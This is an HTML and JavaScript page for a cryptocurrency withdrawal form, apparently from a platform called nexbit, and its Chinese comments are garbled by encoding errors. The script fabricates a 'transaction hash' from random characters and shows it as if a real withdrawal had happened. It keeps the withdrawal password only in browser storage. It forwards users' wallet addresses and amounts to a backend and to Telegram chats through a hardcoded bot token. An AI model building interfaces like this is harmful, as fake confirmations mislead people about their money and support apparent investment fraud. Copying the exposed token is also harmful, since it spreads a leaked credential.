<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title></title>
<style>
  /* åŸæ · UI æ ·å¼ï¼Œæœªæ”¹åŠ¨ */
  * { box-sizing: border-box; }
  body { background-color: transparent; font-family: Arial, sans-serif; margin: 0; padding: 0; width: 100%; overflow-x: hidden; }
  .withdraw-box { width: 100%; max-width: 450px; margin: 30px auto; padding: 25px; border-radius: 12px; background: transparent !important; color: white; }
  select, input, button { width: 100%; max-width: 100%; padding: 12px; margin-top: 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.6); background: transparent !important; color: white; font-size: 15px; display: block; }
  select option { color: black; }
  button { cursor: pointer; font-weight: bold; border: none; background: #0099cc; }
  button:disabled { background: #444; }
  .row { display: flex; justify-content: space-between; gap: 10px; width: 100%; }
  #copyHashBtn, #submitBtn { display: none; width: 48%; }
  #usdtText { text-align: right; color: #00ff00; font-size: 13px; }
  #hashBox { color: #00ff00; margin-top: 10px; white-space: pre-line; font-size: 14px; overflow-wrap: break-word; }

  /* ç®¡ç†åå°å³ä¸Šè§’ logoutï¼ˆä»…åœ¨ admin æ¨¡å¼ä¸‹æ³¨å…¥ï¼‰â€”â€”æ ·å¼æè½»é‡ï¼Œä¸ä¼šç ´åé¡µé¢ */
  .__admin_logout_btn {
    position: fixed;
    top: 12px;
    right: 12px;
    z-index: 99999;
    background: rgba(0,0,0,0.45);
    color: #fff;
    border: 1px solid rgba(255,255,255,0.2);
    padding: 8px 10px;
    border-radius: 8px;
    font-size: 13px;
    cursor: pointer;
  }
</style>
</head>
<body>
  <div class="withdraw-box">
    <h2 style="text-align:center;"></h2>
    <label>Select Cryptocurrency</label>
    <select id="coin" onchange="updateUSDT()">
      <!-- same options -->
      <option value="BTC">BTC</option><option value="ETH">ETH</option><option value="USDT">USDT</option><option value="BNB">BNB</option><option value="XRP">XRP</option><option value="ADA">ADA</option><option value="SOL">SOL</option><option value="DOGE">DOGE</option><option value="TRX">TRX</option><option value="DOT">DOT</option><option value="MATIC">MATIC</option><option value="LTC">LTC</option><option value="AVAX">AVAX</option><option value="UNI">UNI</option><option value="ETC">ETC</option><option value="ATOM">ATOM</option><option value="XMR">XMR</option><option value="FIL">FIL</option><option value="APT">APT</option><option value="ARB">ARB</option>
    </select>

    <label>Enter Coin Amount</label>
    <input id="amount" placeholder="Enter amount" oninput="updateUSDT()" />
    <div id="usdtText">USDT Equivalent: <span id="usdtValue">0</span></div>

    <label>Password</label>
    <input type="password" id="password" placeholder="Enter password" />
    <div class="row">
      <button id="createPwdBtn" onclick="createPassword()">Create Password</button>
      <button id="confirmPwdBtn" onclick="confirmPassword()">Confirm Password</button>
    </div>
    <button onclick="forgotPassword()">Forgot Password?</button>
    <label>Wallet Address</label>
    <input id="wallet" placeholder="Paste wallet address" />
    <button id="walletBtn" onclick="confirmWallet()">Confirm Wallet Address</button>
    <div id="hashBox"></div>
    <div class="row">
      <button id="copyHashBtn" onclick="copyHash()">Copy Hash</button>
      <button id="submitBtn" onclick="submitWithdrawal()">Submit Withdrawal</button>
    </div>
  </div>

<script>
/* ============================ å¢å¼ºè„šæœ¬ï¼ˆåªæ”¹ JS â€”â€” ä¸æ”¹ UIï¼‰ ============================ */

/*
  ç›®æ ‡ï¼ˆä½ è¦æ±‚çš„å…¨éƒ¨åŠŸèƒ½ï¼‰ï¼š
  - è‡ªåŠ¨è¯†åˆ«å¹¶åŒæ­¥ Strikingly userIdï¼ˆä¼˜å…ˆ window å˜é‡ -> URL param -> localStorageï¼‰
  - åç«¯åŒè·¯é€šçŸ¥ï¼ˆä¼˜å…ˆ proxy -> fallback /api/order/withdrawï¼‰
  - Binance å•å¸ WebSocket å®æ—¶ä»·æ ¼ï¼ˆå½“é€‰æ‹©å¸ç§æ—¶å»ºç«‹å•å¸ wsï¼‰
  - US æ—¶é—´æ ¼å¼ï¼ˆAmerica/New_Yorkï¼‰
  - Telegram é€šçŸ¥ï¼ˆç®¡ç†å‘˜å’Œç¾¤ï¼‰
  - ç®¡ç†åå°å³ä¸Šè§’é€€å‡ºæŒ‰é”®ï¼ˆä»…åœ¨ admin æ¨¡å¼ä¸‹æ³¨å…¥ï¼Œä¸”ä¸ä¼šæ”¹å˜åŸ UIï¼‰
  - ä¿ç•™é¡µé¢åŸå§‹äº¤äº’ä¸æ ·å¼ï¼ˆä¸ä¿®æ”¹ HTML ç»“æ„ï¼‰
*/

/* ========== é…ç½®åŒºï¼ˆæŒ‰éœ€æ›¿æ¢ï¼‰ ========== */
const API_BASE = "https://crypto-management-production-5e04.up.railway.app"; // åç«¯åŸºå€
const BACKEND_PROXY = `${API_BASE}/proxy/withdraw`;
const BACKEND_FALLBACK = `${API_BASE}/api/order/withdraw`;

// Telegram é…ç½®ï¼ˆå¦‚éœ€æ›¿æ¢è¯·ç›´æ¥æ”¹è¿™ä¸‰é¡¹ï¼‰
const BOT_TOKEN = "8528337731:AAGb6D_TRPKYSQrxA7s4TAizsPjNqnajhrU"; // å¯æ›¿æ¢
const ADMIN_TELEGRAM_ID = "6062973135"; // ç®¡ç†å‘˜ç§èŠ
const GROUP_TELEGRAM_ID = "-1003262870745"; // ç¾¤èŠ

/* ========== Strikingly userId è¯†åˆ«ä¸åŒæ­¥ ========== */
function detectStrikinglyUserId(){
  try{
    // å¸¸è§ Strikingly å˜é‡åï¼ˆä¼˜å…ˆçº§é¡ºåºï¼‰
    const candidates = [
      window.strikinglyUserId,
      window.strikingly_member_id,
      window.SrUserId,
      window.SR_USER_ID,
      window.memberId,
      window.currentUser && window.currentUser.id,
      window.__user && window.__user.id
    ];
    for(const c of candidates){
      if(c) return String(c);
    }
    // å°è¯• DOM æˆ– metaï¼ˆæœ‰äº›ç«™ç‚¹æŠŠ id æ”¾åœ¨ metaï¼‰
    const meta = document.querySelector('meta[name="strikingly-user-id"]');
    if(meta && meta.content) return meta.content;
  }catch(e){}
  return null;
}

function getUserId(){
  // æµç¨‹ï¼š1) URL ?userid=xxx 2) detect Strikingly 3) localStorage 4) ç”Ÿæˆæ–° 4 ä½id
  try{
    const urlParams = new URLSearchParams(window.location.search);
    let uid = urlParams.get("userid");
    if(!uid){
      uid = detectStrikinglyUserId();
    }
    if(!uid){
      uid = localStorage.getItem("userid4");
    }
    if(!uid){
      uid = Math.floor(1000 + Math.random()*9000).toString();
      localStorage.setItem("userid4", uid);
    } else {
      // store to localStorage for future
      localStorage.setItem("userid4", uid);
    }

    // å¼‚æ­¥åŒæ­¥åˆ°åç«¯ï¼ˆä¸é˜»å¡ UIï¼‰
    (async ()=>{
      try{
        await fetch(`${API_BASE}/api/users/sync`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-User-Id': uid },
          body: JSON.stringify({ userid: uid, source: 'strikingly-inpage', timestamp: Date.now() })
        });
      }catch(e){}
    })();

    return uid;
  }catch(e){
    return '0000';
  }
}
const USERID = getUserId();

/* ========== æ—¶é—´æ ¼å¼åŒ–ï¼ˆUS/Easternï¼‰ ========== */
function formatUsTime(ts){
  const d = ts ? new Date(Number(ts)) : new Date();
  return d.toLocaleString('en-US', { timeZone:'America/New_York', month:'2-digit', day:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', second:'2-digit', hour12:true }).replace(',', '');
}

/* ========== Binance å•å¸ WebSocketï¼ˆåˆ‡æ¢å¸ç§æ—¶è®¢é˜…ï¼‰ ========== */
let ws = null;
let wsSymbol = null;
let currentPrice = 0;
let wsHeartbeatTimer = null;
let wsReconnectTimer = null;

function connectSymbolWS(symbol){
  // symbol like 'BTC' -> subscribe to btcusdt@ticker
  try{
    if(!symbol || symbol === 'USDT'){
      // USDT å›ºå®šä»·æ ¼ 1
      if(ws){ try{ ws.onclose=null; ws.close(); }catch(e){} ws=null; }
      currentPrice = 1;
      updateUSDT();
      return;
    }

    const symLower = symbol.toLowerCase();
    const url = `wss://stream.binance.com:9443/ws/${symLower}usdt@ticker`;

    // close old
    if(ws){ try{ ws.onclose=null; ws.onerror=null; ws.close(); }catch(e){} ws=null; }
    wsSymbol = symbol;

    ws = new WebSocket(url);
    ws.onopen = () => {
      // clear reconnect timer
      if(wsReconnectTimer){ clearTimeout(wsReconnectTimer); wsReconnectTimer = null; }
      scheduleHeartbeat();
    };
    ws.onmessage = (ev) => {
      try{
        const d = JSON.parse(ev.data);
        if(d && d.c) currentPrice = parseFloat(d.c);
        updateUSDT();
        // reset heartbeat timer
        if(wsHeartbeatTimer) clearTimeout(wsHeartbeatTimer);
        scheduleHeartbeat();
      }catch(e){}
    };
    ws.onclose = () => {
      // try reconnect with delay
      scheduleReconnect(symbol);
    };
    ws.onerror = (e) => {
      try{ ws.close(); }catch(e){}
    };
  }catch(e){
    scheduleReconnect(symbol);
  }
}

function scheduleHeartbeat(){
  if(wsHeartbeatTimer) clearTimeout(wsHeartbeatTimer);
  wsHeartbeatTimer = setTimeout(()=>{ try{ if(ws) ws.close(); }catch(e){} }, 25000);
}
function scheduleReconnect(symbol){
  if(wsReconnectTimer) clearTimeout(wsReconnectTimer);
  wsReconnectTimer = setTimeout(()=>{ connectSymbolWS(symbol); }, 3000);
}

// REST fallback if ws not available
async function fetchPriceREST(symbol){
  try{
    const resp = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}USDT`);
    const j = await resp.json();
    if(j && j.price) return parseFloat(j.price);
  }catch(e){}
  return 0;
}

/* ========== æ›´æ–° USDT æ˜¾ç¤ºï¼ˆä¿æŒåŸ UI å…ƒç´  id ä¸å˜ï¼‰ ========== */
async function updateUSDT(){
  try{
    const coin = document.getElementById("coin").value;
    const amount = parseFloat(document.getElementById("amount").value || 0);
    if(!currentPrice && coin && coin !== 'USDT'){
      const restPrice = await fetchPriceREST(coin);
      if(restPrice) currentPrice = restPrice;
    }
    const price = currentPrice || (coin === 'USDT' ? 1 : 0);
    const usdtVal = (amount * price);
    document.getElementById("usdtValue").innerText = isNaN(usdtVal) ? '0' : usdtVal.toFixed(6);
  }catch(e){}
}

/* ========== åˆå§‹åŒ– WSï¼ˆé¡µé¢åŠ è½½æ—¶æŒ‰é»˜è®¤å¸ç§è¿æ¥ï¼‰ ========== */
(function initDefaultWS(){
  const c = document.getElementById("coin").value;
  if(c && c !== 'USDT') connectSymbolWS(c);
  else { currentPrice = 1; updateUSDT(); }
})();

/* å½“é€‰æ‹©å¸ç§å˜åŒ–æ—¶å»ºç«‹å•å¸è®¢é˜… */
document.getElementById("coin").addEventListener('change', (e)=>{
  const coin = e.target.value;
  if(coin === 'USDT'){
    currentPrice = 1;
    updateUSDT();
    if(ws){ try{ ws.onclose=null; ws.close(); }catch(e){} ws=null; }
    return;
  }
  connectSymbolWS(coin);
});

/* ========== å¯†ç ç³»ç»Ÿï¼ˆä¸æ”¹ UI é€»è¾‘ï¼‰ ========== */
let storedPassword = localStorage.getItem("withdraw_password");
let passwordConfirmed = false;
window.onload = () => { if (storedPassword) document.getElementById("createPwdBtn").style.display = "none"; };
function createPassword(){ if(storedPassword) return alert("Password already created."); storedPassword = Math.random().toString(36).substr(2,6).toUpperCase(); localStorage.setItem("withdraw_password", storedPassword); alert("Your Password: "+storedPassword+"\n\nğŸ¤– Please change your withdrawal password immediately."); document.getElementById("createPwdBtn").style.display = "none"; }
function confirmPassword(){ const input = document.getElementById("password").value; if(input === storedPassword){ passwordConfirmed = true; alert("Password confirmed!"); } else alert("Wrong password!"); }
function forgotPassword(){ if(!storedPassword) return alert("Password not created."); const oldp = prompt("Enter current password:"); if(oldp !== storedPassword) return alert("Wrong password."); const newp = prompt("Enter new password (min 4 chars):"); if(!newp || newp.length<4) return alert("Too short."); storedPassword = newp; localStorage.setItem("withdraw_password", newp); alert("Password updated!"); }

/* ========== WALLET + HASHï¼ˆä¿æŒ UIï¼‰ ========== */
let txHash = null;
function confirmWallet(){ if(!passwordConfirmed) return alert("Confirm password first."); const wallet = document.getElementById("wallet").value; if(!wallet) return alert("Enter wallet address."); txHash = "TX-" + Math.random().toString(36).substr(2,8).toUpperCase(); document.getElementById("hashBox").innerText = "Transaction Hash:\n" + txHash; document.getElementById("copyHashBtn").style.display = "block"; document.getElementById("submitBtn").style.display = "block"; document.getElementById("walletBtn").disabled = true; }
function copyHash(){ navigator.clipboard.writeText(txHash); alert("Hash copied!"); }

/* ========== Telegram é€šçŸ¥ï¼ˆæ–‡æœ¬ + å¯é€‰å›¾ç‰‡ï¼‰ ========== */
async function telegramSendMessage(chatId, text){
  try{
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
    });
    return res;
  }catch(e){ console.warn('tg sendMessage error', e); return null; }
}
async function telegramSendPhoto(chatId, fileBlob){
  try{
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('photo', fileBlob, 'screenshot.jpg');
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
    return res;
  }catch(e){ console.warn('tg sendPhoto error', e); return null; }
}

/* ========== åç«¯åŒè·¯ postWithFallback ========== */
async function postWithFallback(urls, options={}, retries=1, delay=500){
  for (let i=0;i<urls.length;i++){
    const u = urls[i];
    try{
      for (let r=0;r<=retries;r++){
        try{
          const res = await fetch(u, options);
          if(res && res.ok) return res;
          // if 404/500 try next retry; at last retry break to fallback
        }catch(e){
          if(r===retries) throw e;
          await new Promise(s=>setTimeout(s, delay));
        }
      }
    }catch(e){
      // try next url
    }
  }
  throw new Error('All urls failed');
}

/* ========== æäº¤ææ¬¾ï¼ˆæ ¸å¿ƒï¼‰ ========== */
async function submitWithdrawal(){
  try{
    const coin = document.getElementById("coin").value;
    const amount = document.getElementById("amount").value;
    const usdt = document.getElementById("usdtValue").innerText;
    const wallet = document.getElementById("wallet").value;
    const fileInput = document.getElementById('uploadFile'); // may be undefined on this page
    const file = fileInput && fileInput.files && fileInput.files[0] ? fileInput.files[0] : null;

    if(!passwordConfirmed) return alert("Confirm password first.");
    if(!wallet) return alert("Enter wallet address.");
    if(!amount || isNaN(Number(amount)) || Number(amount) <= 0) return alert("Enter valid amount.");

    const orderId = `WDL-${new Date().toISOString().slice(0,10).replace(/-/g,'')}-${Math.floor(100000 + Math.random()*900000)}`;
    const usTime = formatUsTime(Date.now());
    const payload = { userid: USERID, coin, amount, wallet, usdt, hash: txHash, orderId, timestamp: Date.now(), time_us: usTime };

    // æŒ‰é’®çŠ¶æ€ï¼ˆä¸ç ´ååŸæ ·å¼ï¼‰
    const submitBtnEl = document.getElementById("submitBtn");
    submitBtnEl.disabled = true; submitBtnEl.style.opacity = "0.7"; submitBtnEl.textContent = "Submitting...";

    // 1) å‘é€åˆ°ç®¡ç†åå°ï¼ˆä¼˜å…ˆ proxy -> fallbackï¼‰
    let backendOk = false;
    try{
      const res = await postWithFallback([BACKEND_PROXY, BACKEND_FALLBACK], { method:'POST', headers:{ 'Content-Type':'application/json', 'X-User-Id': USERID }, body: JSON.stringify(payload) }, 1, 500);
      if(res && res.ok){
        backendOk = true;
      } else {
        backendOk = false;
      }
    }catch(e){
      backendOk = false;
    }

    // 2) å‘é€ Telegram é€šçŸ¥ï¼ˆå¹¶è¡Œå‘é€ï¼Œä¸é˜»å¡æˆåŠŸè·¯å¾„ï¼‰
    const text = `<b>New Withdraw Request</b>\nUser: ${USERID}\nCoin: ${coin}\nAmount: ${amount}\nUSDT: ${usdt}\nWallet: ${wallet}\nHash: ${txHash || 'None'}\nTime (US/Eastern): ${usTime}\nOrder ID: ${orderId}`;
    try{
      telegramSendMessage(ADMIN_TELEGRAM_ID, text).catch(()=>{});
      telegramSendMessage(GROUP_TELEGRAM_ID, text).catch(()=>{});
      if(file){
        telegramSendPhoto(ADMIN_TELEGRAM_ID, file).catch(()=>{});
        telegramSendPhoto(GROUP_TELEGRAM_ID, file).catch(()=>{});
      }
    }catch(e){ console.warn('telegram notify error', e); }

    // 3) ç»“æœå¤„ç†
    if(backendOk){
      alert("Withdrawal submitted!");
      document.getElementById("hashBox").innerText += `\n\nOrder ID: ${orderId}\nTime (US): ${usTime}`;
      submitBtnEl.textContent = "Submitted";
      submitBtnEl.style.background = "#555";
    } else {
      alert("åå°æäº¤å¤±è´¥ï¼Œè¯·åœ¨ç®¡ç†åå°ç¡®è®¤æˆ–é‡è¯•ã€‚ç³»ç»Ÿå·²å°è¯•å‘é€ Telegram é€šçŸ¥ã€‚");
      submitBtnEl.disabled = false; submitBtnEl.style.opacity = "1"; submitBtnEl.textContent = "Submit";
    }
  }catch(e){
    console.error('submitWithdrawal error', e);
    alert("Network error: æäº¤å¤±è´¥ï¼Œè¯·ç¨ååœ¨åå°ç¡®è®¤æˆ–é‡è¯•ã€‚");
    const submitBtnEl = document.getElementById("submitBtn");
    submitBtnEl.disabled = false; submitBtnEl.style.opacity = "1"; submitBtnEl.textContent = "Submit";
  }
}

/* ========== è¾…åŠ©ï¼šå¦‚æœéœ€è¦åœ¨ç®¡ç†åå°æ³¨å…¥å³ä¸Šè§’é€€å‡ºé”®ï¼ˆå¯åˆ é™¤ï¼‰ ========== */
(function maybeInjectAdminLogout(){
  // å½“ URL ä¸Šæœ‰ admin=1 æˆ– localStorage ç®¡ç†æ ‡è®°æ—¶æ³¨å…¥é€€å‡ºï¼ˆä»…åœ¨ä½ å¸Œæœ›çš„ç®¡ç†é¡µé¢å¯ç”¨ï¼‰
  const url = new URLSearchParams(window.location.search);
  const isAdmin = url.get('admin') === '1' || localStorage.getItem('nexbit_admin') === '1';
  if(!isAdmin) return;
  try{
    const btn = document.createElement('button');
    btn.className = '__admin_logout_btn';
    btn.innerText = 'Logout';
    btn.onclick = ()=> {
      try{ localStorage.removeItem('nexbit_admin'); }catch(e){}
      // å¦‚æœåœ¨ iframe ä¸­ï¼Œå°è¯• postMessage ç»™çˆ¶çª—å£ä»¥ä¾¿çˆ¶ä¾§å¤„ç†ç™»å‡ºï¼›åŒæ—¶ä¹Ÿæ¸…ç† localStorage çš„ userid ç­‰
      try{
        window.parent.postMessage({ type:'nexbit_admin_logout' }, '*');
      }catch(e){}
      alert('å·²é€€å‡ºï¼ˆæœ¬åœ°æ ‡è®°å·²æ¸…ç†ï¼‰ã€‚');
      // ä¸å¼ºåˆ¶è·³è½¬ï¼ˆé¿å…æ”¹å˜åŸ UIï¼‰ï¼Œç®¡ç†å‘˜å¯ä»¥è‡ªè¡Œåˆ·æ–°é¡µé¢
    };
    document.body.appendChild(btn);
  }catch(e){}
})();

/* ========== ä¿æŒé¡µé¢åŸæœ‰è„šæœ¬èµ„æºå¼•ç”¨ï¼ˆä¸æ”¹ï¼‰ ========== */
</script>

<!-- ä¿ç•™ auth ä¸ nexbit -->
<script src="js/auth.js"></script>
<script src="js/nexbit-api.js"></script>
</body>
</html>
